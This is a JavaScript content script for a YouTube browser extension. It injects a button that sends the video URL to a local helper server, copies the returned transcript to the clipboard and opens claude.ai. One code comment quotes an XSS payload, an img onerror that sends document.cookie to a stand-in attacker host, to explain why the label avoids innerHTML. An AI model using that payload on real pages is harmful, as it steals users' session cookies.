// Uoink — content script.
// Injects an Uoink button under the YouTube player (alongside Like / Share /
// Download) that POSTs the current video URL to the local helper server,
// copies the returned markdown to the clipboard, and opens claude.ai in a
// new tab.
//
// Network/storage logic lives in lib/extract.js (exposed as window.STC) and
// is shared with background.js.

(() => {
  "use strict";

  const BTN_CLASS = "uoink-btn";
  const BTN_ID = "stc-yt-send-to-claude";
  const ANCHOR_SELECTORS = [
    "ytd-watch-metadata #top-level-buttons-computed",
    "#top-level-buttons-computed",
    "ytd-watch-metadata #actions-inner",
    "ytd-watch-metadata #actions",
    "#actions-inner",
    "#actions",
  ];
  // Class marking the button as the free-floating Shorts variant. On
  // /shorts/<id> pages YouTube's like/dislike/share column has no stable
  // insertion slot: its DOM is rebuilt per-reel as the user scrolls, and the
  // markup has churned across YouTube revisions (Sprint 10's `#actions`-based
  // anchor never rendered in Ryan's smoke test). So Shorts gets a
  // fixed-position button parented to <body> — it survives Shorts-to-Shorts
  // transitions and needs no anchor element at all.
  const SHORTS_FLOATING_CLASS = "stc-yt-shorts-floating";
  const LAST_YOINK_CLIPBOARD_KEY = "yoink_last_clipboard_at";
  const LAST_CLIPBOARD_BUDGET_KEY = "yoink_last_clipboard_budget";

  // ---- Styles (scoped via the unique class prefix) ----------------------
  const STYLE_ID = "stc-yt-styles";
  const DOT_CLASS = "stc-yt-status-dot";
  function injectStyles() {
    if (document.getElementById(STYLE_ID)) return;
    const style = document.createElement("style");
    style.id = STYLE_ID;
    style.textContent = `
      .${BTN_CLASS} {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        height: 36px;
        padding: 0 16px;
        margin-left: 8px;
        border: none;
        border-radius: 18px;
        background: #C2410C;
        color: #FFF4EC;
        font-family: "Roboto", "Arial", sans-serif;
        font-size: 14px;
        font-weight: 600;
        line-height: 36px;
        cursor: pointer;
        white-space: nowrap;
        transition: background-color 0.15s ease, color 0.15s ease, transform 0.12s ease;
      }
      .${BTN_CLASS}:focus-visible {
        outline: 1px solid #FFF4EC;
        outline-offset: 1px;
      }
      /* Shorts variant — a fixed-position pill in the lower-right, sitting
         below the like/dislike/share column. Parented to <body> so YouTube
         rebuilding the reel DOM on Shorts-to-Shorts scroll cannot remove it.
         Declared before the error/success rules below so those still win
         the background color when the button flips state. */
      .${BTN_CLASS}.${SHORTS_FLOATING_CLASS} {
        position: fixed;
        right: 24px;
        bottom: 84px;
        margin: 0;
        z-index: 2000;
        height: 40px;
        border-radius: 20px;
        background: #15110D;
        color: #FFF4EC;
        box-shadow: 0 2px 10px rgba(0,0,0,0.5);
        border: 1px solid #2C2621;
      }
      .${BTN_CLASS}.${SHORTS_FLOATING_CLASS}:hover {
        background: #C2410C;
        box-shadow: 0 2px 14px rgba(0,0,0,0.6);
      }
      .${BTN_CLASS}:hover {
        background: #FF3D00;
        color: #0A0A0A;
      }
      .${BTN_CLASS}:active {
        transform: translateY(1px) scale(0.97);
      }
      .${BTN_CLASS}[disabled] { opacity: 0.7; cursor: progress; }
      .${BTN_CLASS}.stc-yt-error { background: #3A1F1F; color: #FFD9D9; }
      .${BTN_CLASS}.stc-yt-success { background: #1F2B22; color: #D9FFE7; }

      /* Live server status — an 8px dot to the left of the label. */
      .${BTN_CLASS} .${DOT_CLASS} {
        width: 8px;
        height: 8px;
        border-radius: 50%;
        flex-shrink: 0;
        background: #888;
        transition: background-color 0.18s ease, box-shadow 0.18s ease;
      }
      .${BTN_CLASS}.uoink-status-online .${DOT_CLASS} {
        background: #00C853;
        box-shadow: 0 0 6px rgba(0,200,83,0.55);
      }
      .${BTN_CLASS}.uoink-status-offline .${DOT_CLASS} {
        background: #B8421A;
        box-shadow: 0 0 6px rgba(184,66,26,0.55);
      }
      .${BTN_CLASS}.uoink-status-checking .${DOT_CLASS} {
        background: #888;
        animation: stc-yt-pulse 1.4s ease-in-out infinite;
      }
      .${BTN_CLASS}.uoink-status-checking { cursor: progress; }
      /* One-shot transition flash when state actually changes. */
      .${BTN_CLASS} .${DOT_CLASS}.stc-yt-flash {
        animation: stc-yt-dot-flash 0.55s ease-out;
      }
      @keyframes stc-yt-pulse {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.35; }
      }
      @keyframes stc-yt-dot-flash {
        0% { transform: scale(1); }
        45% { transform: scale(1.7); }
        100% { transform: scale(1); }
      }

      .${BTN_CLASS} .stc-yt-icon {
        width: 11px;
        height: 14px;
        flex-shrink: 0;
        margin-right: 2px;
      }
      .${BTN_CLASS} .stc-yt-spinner {
        width: 14px; height: 14px;
        border: 2px solid rgba(255,255,255,0.3);
        border-top-color: currentColor;
        border-radius: 50%;
        animation: stc-yt-spin 0.7s linear infinite;
      }
      @keyframes stc-yt-spin { to { transform: rotate(360deg); } }
    `;
    document.head.appendChild(style);
  }

  const ICON_SVG = `
    <svg class="stc-yt-icon" viewBox="0 0 100 100" width="11" height="14" aria-hidden="true" style="display: block;">
      <path d="M 0 0 L 32 0 L 32 60 L 68 60 L 68 0 L 100 0 L 100 80 Q 100 100 80 100 L 20 100 Q 0 100 0 80 Z" fill="currentColor"/>
      <rect x="0" y="0" width="32" height="20" fill="#FFF4EC"/>
      <rect x="68" y="0" width="32" height="20" fill="#FFF4EC"/>
    </svg>
  `;
  const DOT_SVG = `<span class="${DOT_CLASS}" aria-hidden="true"></span>`;

  function setButtonState(btn, state, label) {
    btn.classList.remove("stc-yt-error", "stc-yt-success");
    if (state === "error") btn.classList.add("stc-yt-error");
    if (state === "success") btn.classList.add("stc-yt-success");
    // Build button contents without ever putting `label` into innerHTML.
    // `label` flows from activeSession.name (chrome.storage, user-controlled
    // via the popup's session-name input) into this function. Interpolating
    // it into innerHTML would let a session named e.g.
    //   <img src=x onerror="fetch('//attacker/'+document.cookie)">
    // execute script in the YouTube page origin. Build the static chrome
    // via innerHTML on a throwaway container (constants only), then append
    // the label as a textContent span.
    btn.replaceChildren();
    const chromeWrap = document.createElement("span");
    chromeWrap.style.display = "inline-flex";
    chromeWrap.style.alignItems = "center";
    chromeWrap.style.gap = "6px";
    if (state === "working") {
      btn.disabled = true;
      chromeWrap.innerHTML = `<span class="stc-yt-spinner"></span>`;
    } else {
      // Only re-enable when not in the "checking" status (which gates clicks).
      btn.disabled = serverStatus === "checking";
      chromeWrap.innerHTML = `${DOT_SVG}${ICON_SVG}`;
    }
    while (chromeWrap.firstChild) btn.appendChild(chromeWrap.firstChild);
    const labelEl = document.createElement("span");
    labelEl.textContent = label;
    btn.appendChild(labelEl);
  }

  function resetButtonAfter(btn, ms) {
    setTimeout(() => setButtonState(btn, "default", defaultLabel()), ms);
  }

  function notify(title, message) {
    try {
      chrome.runtime.sendMessage({ type: "notify", title, message });
    } catch (e) {
      console.warn("[Uoink] notify failed", e);
    }
  }

  function openTab(url) {
    try {
      chrome.runtime.sendMessage({ type: "openTab", url });
    } catch (e) {
      console.warn("[Uoink] openTab failed", e);
    }
  }

  // Throttled — prevents tab spam if the user mashes Uoink while the server
  // is still offline. 5s window resets per page load.
  let _lastSetupOpen = 0;
  function openSetupOffline() {
    const now = Date.now();
    if (now - _lastSetupOpen < 5000) return;
    _lastSetupOpen = now;
    try {
      openTab(chrome.runtime.getURL("setup.html?source=offline"));
    } catch (e) {
      console.warn("[Uoink] openSetupOffline failed", e);
    }
  }

  // ---- Live server status ------------------------------------------------
  // Visible signal next to the button label so the user knows whether a
  // click will uoink (online) or pop the setup guide (offline).
  const STATUS_POLL_MS = 10_000;
  let serverStatus = "checking"; // "checking" | "online" | "offline"
  let statusTimer = null;
  let statusInflight = false;

  function applyStatusToButton(btn) {
    if (!btn) return;
    // Mid-uoink — don't clobber the working state. Status applies when the
    // post-uoink reset puts the button back into default mode.
    if (btn.querySelector(".stc-yt-spinner")) return;
    btn.classList.remove("uoink-status-online", "uoink-status-offline", "uoink-status-checking");
    btn.classList.add(`uoink-status-${serverStatus}`);
    if (serverStatus === "online") {
      btn.title = "Extract transcript + screenshots and open Claude";
      btn.disabled = false;
    } else if (serverStatus === "offline") {
      btn.title = "Uoink Helper offline. Click to start.";
      btn.disabled = false;
    } else {
      btn.title = "Checking Uoink Helper status...";
      btn.disabled = true;
    }
  }

  function flashDot(btn) {
    const dot = btn && btn.querySelector(`.${DOT_CLASS}`);
    if (!dot) return;
    dot.classList.remove("stc-yt-flash");
    // Re-trigger the animation by forcing a reflow, then re-adding the class.
    void dot.offsetWidth;
    dot.classList.add("stc-yt-flash");
  }

  function setServerStatus(next) {
    if (serverStatus === next) return;
    const prev = serverStatus;
    serverStatus = next;
    const btn = document.getElementById(BTN_ID);
    if (btn) {
      applyStatusToButton(btn);
      // Flash on real online↔offline transitions, not on the initial
      // checking→online or checking→offline reveal.
      if (prev !== "checking") flashDot(btn);
    }
  }

  // A caller that needs the verdict (the Retry handoff) waits for the poll
  // already in flight instead of returning before it lands.
  let statusPoll = null;
  function pollStatus() {
    if (!statusPoll) {
      statusPoll = pollStatusOnce().finally(() => { statusPoll = null; });
    }
    return statusPoll;
  }

  async function pollStatusOnce() {
    if (statusInflight) return;
    statusInflight = true;
    try {
      // Proxy through the SW: direct loopback fetches from a YouTube content
      // script can be intercepted by Chrome tracking protection or AV web
      // shields, which would paint the button "offline" even when the
      // server is responding.
      const res = await new Promise((resolve) => {
        try {
          chrome.runtime.sendMessage({ type: "stcPing" }, (r) => {
            if (chrome.runtime.lastError) return resolve(null);
            resolve(r || null);
          });
        } catch { resolve(null); }
      });
      setServerStatus(res && res.ok ? "online" : "offline");
    } catch {
      setServerStatus("offline");
    } finally {
      statusInflight = false;
    }
  }

  function startStatusPolling() {
    stopStatusPolling();
    pollStatus(); // immediate
    statusTimer = setInterval(pollStatus, STATUS_POLL_MS);
  }
  function stopStatusPolling() {
    if (statusTimer) {
      clearInterval(statusTimer);
      statusTimer = null;
    }
  }

  document.addEventListener("visibilitychange", () => {
    if (document.hidden) {
      stopStatusPolling();
    } else if (isSupportedVideoPage()) {
      // Fire an immediate check on resume so a server we missed coming back
      // online doesn't make the user wait the full 10s.
      startStatusPolling();
    }
  });

  // ---- Active session awareness -----------------------------------------
  let activeSession = null;

  function getActiveFromStorage() {
    return new Promise((resolve) => {
      try {
        chrome.storage.local.get({ active_session: null }, (items) => {
          resolve(items.active_session || null);
        });
      } catch { resolve(null); }
    });
  }

  function defaultLabel() {
    return activeSession ? `Add to session: ${activeSession.name || activeSession.id}` : "Uoink";
  }

  function refreshDefaultLabel() {
    const btn = document.getElementById(BTN_ID);
    if (!btn || btn.disabled) return;
    setButtonState(btn, "default", defaultLabel());
  }

  chrome.storage.onChanged.addListener((changes, area) => {
    if (area === "local" && changes.active_session) {
      activeSession = changes.active_session.newValue || null;
      refreshDefaultLabel();
    }
  });

  // ---- Click handler ----------------------------------------------------
  function normalizedCurrentVideoUrl() {
    return STC.normalizeYouTubeUrl(window.location.href);
  }

  function isSupportedVideoPage() {
    return !!normalizedCurrentVideoUrl();
  }

  function isShortsPage() {
    try {
      return new URL(window.location.href).pathname.startsWith("/shorts/");
    } catch {
      return false;
    }
  }

  function isMobileYouTube() {
    try {
      return new URL(window.location.href).hostname === "m.youtube.com";
    } catch {
      return false;
    }
  }

  function usesFloatingButton() {
    return isShortsPage() || isMobileYouTube();
  }

  function pageVideoTitle() {
    const meta = document.querySelector("meta[name='title']");
    const raw = (meta && meta.content) || document.title || "";
    return raw.replace(/\s+-\s+YouTube\s*$/i, "").trim();
  }

  function markClipboardUoinkNow() {
    try {
      chrome.storage.local.set({ [LAST_YOINK_CLIPBOARD_KEY]: Date.now() });
    } catch { /* ignore */ }
  }

  function screenshotCountFromData(data, text) {
    return globalThis.UoinkUI.screenshotCountFromData(data, text);
  }

  function rememberClipboardBudget(data, clipboardText) {
    const budget = globalThis.UoinkUI.clipboardBudgetFromData(data, clipboardText);
    try {
      chrome.storage.local.set({ [LAST_CLIPBOARD_BUDGET_KEY]: budget });
    } catch { /* ignore */ }
  }

  function minutesUntil(value) {
    return globalThis.UoinkUI.minutesUntil(value);
  }

  function queuedMessage(data) {
    return globalThis.UoinkUI.queuedMessage(data, {
      suffix: "Open the Uoink popup for status.",
    });
  }

  function rememberFailure(url, error, replacesId) {
    STC.rememberFailure(url, error, { title: pageVideoTitle() }, replacesId);
  }

  // E7: a thrown request is not proof the helper is down. Only an offline
  // verdict (the /health ping failed too) points at the setup guide.
  async function showThrownFailure(btn, e) {
    const failure = await STC.describeCaptureError(e);
    setButtonState(btn, "error", failure.label);
    btn.title = failure.message;
    notify(failure.title, failure.message);
    if (failure.kind === "offline") openSetupOffline();
    resetButtonAfter(btn, 5000);
  }

  async function onClick(btn) {
    const url = normalizedCurrentVideoUrl();
    if (!url) return;

    // Gate by live server status: don't even attempt uoink while the helper
    // is down — pop the setup guide instead. The "checking" state is
    // disabled at the button level so this branch usually isn't reached.
    if (serverStatus === "checking") return;
    if (serverStatus === "offline") {
      notify("Uoink Helper offline", STC.helperOfflineHint());
      openSetupOffline();
      return;
    }

    activeSession = await getActiveFromStorage(); // freshen in case popup just changed it
    const interval = await STC.getInterval();

    if (activeSession && activeSession.id) {
      return runSessionAdd(btn, url, interval);
    }
    return runExtract(btn, url, interval);
  }

  async function runExtract(btn, url, interval) {
    setButtonState(btn, "working", "Uoinking...");
    const retryOf = takeRetryFailureId();

    let data;
    try {
      data = await STC.postExtractViaBg(url, interval);
    } catch (e) {
      console.error("[Uoink] extract request failed", e);
      await showThrownFailure(btn, e);
      return;
    }

    if (!data || !data.ok) {
      const msg = STC.describeFailure(data);
      if (/queue full/i.test(msg)) {
        setButtonState(btn, "error", "Queue full");
        btn.title = "Queue full. Give it a few minutes.";
        notify("Uoink queue full", "Give it a few minutes, then try again.");
        resetButtonAfter(btn, 5000);
        return;
      }
      rememberFailure(url, msg, retryOf);
      setButtonState(btn, "error", "Uoink failed");
      btn.title = msg;
      notify("Uoink failed", msg);
      resetButtonAfter(btn, 5000);
      return;
    }
    STC.forgetFailure(retryOf);

    if (data.queued) {
      setButtonState(btn, "success", "Queued");
      btn.title = queuedMessage(data);
      notify("Uoink queued", queuedMessage(data));
      resetButtonAfter(btn, 5000);
      return;
    }

    // Sprint 3: Smart Screenshot Picker intercept. Default off keeps v1
    // behavior byte-identical. When enabled, we hand the corpus off to the
    // popup via chrome.storage.local instead of clipboard + Claude tab.
    if (await _useScreenshotPicker()) {
      rememberClipboardBudget(data, data.corpus_md_paste || data.yoink_md);
      await STC.stashPickerCorpus(data);
      notify("Uoink ready",
             "Click the Uoink icon to pick which screenshots to include.");
      setButtonState(btn, "success", "Pick screenshots →");
      btn.title = `Saved to: ${data.folder}. Click the Uoink icon to finish.`;
      resetButtonAfter(btn, 5000);
      return;
    }

    // Prefer the multimodal paste version (transcript + base64-embedded
    // screenshots) so a single Ctrl+V delivers both into Claude/ChatGPT.
    // The file version (yoink_md) is the dev-mode fallback when Pillow
    // wasn't bundled or paste generation failed.
    const clipboardText = data.corpus_md_paste || data.yoink_md;
    rememberClipboardBudget(data, clipboardText);
    let copied = false;
    try {
      // Keep corpus text out of the page DOM, including on clipboard failure.
      const response = await chrome.runtime.sendMessage({
        type: "copyToClipboard", text: clipboardText,
      });
      copied = !!(response && response.ok === true);
    } catch (e) {
      console.warn("[Uoink] extension clipboard copy failed", e);
    }

    if (!copied) {
      try {
        await chrome.runtime.sendMessage({ type: "clipboardRetry", text: clipboardText });
      } catch { /* ignore */ }
      setButtonState(btn, "error", "Copy blocked");
      btn.title = "Couldn't copy to clipboard. Use the notification's Try again button.";
      resetButtonAfter(btn, 5000);
      return;
    }

    markClipboardUoinkNow();
    openTab("https://claude.ai/new");

    // Same shared helper used by the SW queue path. First successful uoink
    // (whether triggered here or through the right-click menu) gets the
    // CTA copy; subsequent uoinks fall back to the topic-aware copy.
    const message = await STC.buildUoinkedMessage(data, copied);
    notify("Uoinked ★", message);

    setButtonState(btn, "success", "Uoinked ★");
    btn.title = `Saved to: ${data.folder}`;
    resetButtonAfter(btn, 3000);
  }

  async function _useScreenshotPicker() {
    try {
      const res = await STC.getSettings();
      return !!(res && res.ok && res.settings &&
                res.settings.smart_screenshot_picker_enabled === true);
    } catch (e) {
      console.warn("[Uoink] settings fetch failed, picker disabled", e);
      return false;
    }
  }

  async function runSessionAdd(btn, url, interval) {
    const sessionName = activeSession.name || activeSession.id;
    setButtonState(btn, "working", `Adding to ${sessionName}...`);
    const retryOf = takeRetryFailureId();

    let data;
    try {
      data = await STC.addToSessionViaBg(activeSession.id, url, interval);
    } catch (e) {
      console.error("[Uoink] session add request failed", e);
      await showThrownFailure(btn, e);
      return;
    }

    if (!data || !data.ok) {
      const msg = STC.describeFailure(data);
      rememberFailure(url, msg, retryOf);
      setButtonState(btn, "error", "Uoink failed");
      btn.title = msg;
      notify("Uoink failed", msg);
      resetButtonAfter(btn, 5000);
      return;
    }
    STC.forgetFailure(retryOf);

    notify("Added to session",
           `${sessionName} · ${data.video_count} video${data.video_count === 1 ? "" : "s"} so far. ` +
           `End the session in the popup to send to Claude or ChatGPT.`);

    setButtonState(btn, "success", `Added (${data.video_count})`);
    btn.title = `Saved to: ${data.folder}`;
    resetButtonAfter(btn, 3000);
  }

  // ---- Inject -----------------------------------------------------------
  // Anchor lookup for /watch pages only. Shorts deliberately bypasses this —
  // see SHORTS_FLOATING_CLASS for why no Shorts DOM anchor is trusted.
  function findAnchor() {
    for (const sel of ANCHOR_SELECTORS) {
      const el = document.querySelector(sel);
      if (el) return el;
    }
    return null;
  }

  function injectButton() {
    if (!isSupportedVideoPage()) {
      // Navigated off every video/Shorts page — tear down a lingering
      // floating Shorts button. The /watch button lives inside DOM that
      // YouTube discards on navigation, so it needs no explicit cleanup.
      const stale = document.getElementById(BTN_ID);
      if (stale && stale.classList.contains(SHORTS_FLOATING_CLASS)) stale.remove();
      return false;
    }

    const floating = usesFloatingButton();
    const existing = document.getElementById(BTN_ID);
    if (existing) {
      const isFloating = existing.classList.contains(SHORTS_FLOATING_CLASS);
      if (isFloating === floating) {
        // Button already matches the current page type. The floating Shorts
        // or mobile button (parented to <body>) needs nothing further; the
        // desktop /watch button is re-homed if YouTube re-rendered the row.
        if (!floating) {
          const watchAnchor = findAnchor();
          if (watchAnchor && existing.parentElement !== watchAnchor) {
            watchAnchor.appendChild(existing);
          }
        }
        return true;
      }
      // Crossed between anchored desktop and floating mobile/Shorts layouts;
      // discard and rebuild for the new page type.
      existing.remove();
    }

    // Desktop /watch needs an anchor element to live in; Shorts and mobile
    // YouTube float on <body> because their DOM uses different action rows.
    const anchor = floating ? null : findAnchor();
    if (!floating && !anchor) return false;

    injectStyles();

    const btn = document.createElement("button");
    btn.id = BTN_ID;
    btn.className = BTN_CLASS;
    if (floating) btn.classList.add(SHORTS_FLOATING_CLASS);
    btn.type = "button";
    setButtonState(btn, "default", defaultLabel());
    applyStatusToButton(btn);
    btn.addEventListener("click", (ev) => {
      if (!ev.isTrusted) return;
      ev.preventDefault();
      ev.stopPropagation();
      onClick(btn);
    });

    (floating ? document.body : anchor).appendChild(btn);
    // Now that the button exists, fetch the latest active-session state and
    // re-label if needed.
    getActiveFromStorage().then((s) => {
      activeSession = s;
      refreshDefaultLabel();
    });
    // If the setup page handed us a video to auto-yoink, consume the flag.
    maybeAutoUoink(btn).catch((e) => console.warn("[Uoink] auto_yoink failed", e));
    return true;
  }

  // ---- Auto-uoink handoff from setup.html -------------------------------
  // The setup page writes {auto_yoink: {videoId, ts}} to local storage and
  // opens the YouTube URL in a new tab. We trigger the button on the first
  // injection on the matching video, then atomically clear the flag so a
  // page refresh or a different tab doesn't re-fire it.
  // A popup Retry also passes failure_id: that record stays until the
  // retried capture goes through (or is replaced by its new failure).
  const AUTO_UOINK_TTL_MS = 60_000;
  // Bound to the video it was handed off for: navigating elsewhere before
  // the retried capture starts can never make another capture consume it.
  let retryFailure = null;
  function takeRetryFailureId() {
    const pending = retryFailure;
    if (!pending || pending.videoId !== currentVideoId()) return null;
    retryFailure = null;
    return pending.id;
  }
  function currentVideoId() {
    return STC.extractVideoId(window.location.href);
  }
  async function maybeAutoUoink(btn) {
    const stored = await new Promise((r) => {
      try {
        chrome.storage.local.get({ auto_yoink: null }, (i) => r(i.auto_yoink));
      } catch { r(null); }
    });
    if (!stored || !stored.videoId) return;
    if (Date.now() - (stored.ts || 0) > AUTO_UOINK_TTL_MS) {
      try { chrome.storage.local.remove("auto_yoink"); } catch { /* ignore */ }
      return;
    }
    if (currentVideoId() !== stored.videoId) return;

    // Wait for live status to settle so the click isn't swallowed by the
    // "checking" gate on a freshly-loaded YouTube tab.
    if (serverStatus === "checking") {
      try { await pollStatus(); } catch { /* ignore */ }
    }
    // The tab can move on while the health check settles.
    if (currentVideoId() !== stored.videoId) return;

    // Clear before clicking so a concurrent injection (mutation observer +
    // retry loop both fire) can't double-trigger.
    await new Promise((r) => {
      try { chrome.storage.local.remove("auto_yoink", r); } catch { r(); }
    });
    // ...or while the handoff was being cleared.
    if (currentVideoId() !== stored.videoId) return;

    retryFailure = stored.failure_id
      ? { id: stored.failure_id, videoId: stored.videoId }
      : null;
    // This handoff comes from extension storage, not a page-generated event.
    if (!btn.disabled) onClick(btn);
  }

  function tryInjectWithRetries() {
    // Off a video page there is no button to wait for.
    if (!isSupportedVideoPage()) return;
    let tries = 0;
    const maxTries = 20;
    const interval = setInterval(() => {
      tries += 1;
      if (injectButton() || tries >= maxTries) clearInterval(interval);
    }, 500);
  }

  // E2: the manifest loads this script on every YouTube page, because
  // YouTube moves between pages with the History API and Chrome only injects
  // declared scripts on a real page load. So the button and the /health
  // polling self-gate on the URL, re-checked on yt-navigate-finish, popstate
  // and DOM churn (a string compare until the URL actually changes).
  let lastHref = null;
  let onVideoPage = false;
  // Returns true when the URL changed since the last check.
  function syncToUrl() {
    const href = window.location.href;
    if (href === lastHref) return false;
    lastHref = href;
    onVideoPage = isSupportedVideoPage();
    if (!onVideoPage) {
      stopStatusPolling();
      injectButton(); // tears down a lingering floating Shorts button
    } else if (!statusTimer && !document.hidden) {
      startStatusPolling();
    }
    return true;
  }

  window.addEventListener("yt-navigate-finish", () => {
    syncToUrl();
    setTimeout(tryInjectWithRetries, 250);
  });

  window.addEventListener("popstate", () => {
    if (syncToUrl()) setTimeout(tryInjectWithRetries, 250);
  });

  const observer = new MutationObserver(() => {
    syncToUrl();
    if (!onVideoPage) return;
    const btn = document.getElementById(BTN_ID);
    if (!btn) {
      injectButton();
      return;
    }
    // Survive /watch <-> /shorts transitions: if the button's variant no
    // longer matches the current page type, rebuild it. Shorts-to-Shorts
    // scrolls need no action here — the floating button is parented to
    // <body>, which YouTube never tears down between reels.
    if (btn.classList.contains(SHORTS_FLOATING_CLASS) !== isShortsPage()) {
      injectButton();
    }
  });
  observer.observe(document.body, { childList: true, subtree: true });

  chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (!sender || sender.id !== chrome.runtime.id) return;
    if (msg && msg.type === "uoinkShortcutTriggered") {
      const btn = document.getElementById(BTN_ID);
      if (btn) {
        // Extension commands are user actions, but HTMLElement.click() is untrusted.
        if (!btn.disabled) onClick(btn);
        sendResponse({ success: true });
      } else {
        const url = normalizedCurrentVideoUrl();
        if (url) {
          onClick(document.createElement("button"));
          sendResponse({ success: true });
        } else {
          sendResponse({ success: false });
        }
      }
    }
  });

  tryInjectWithRetries();
  // Kick off /health polling on a video page so the button has a real status
  // before the user has time to click. Pause/resume is wired via
  // visibilitychange.
  syncToUrl();
})();
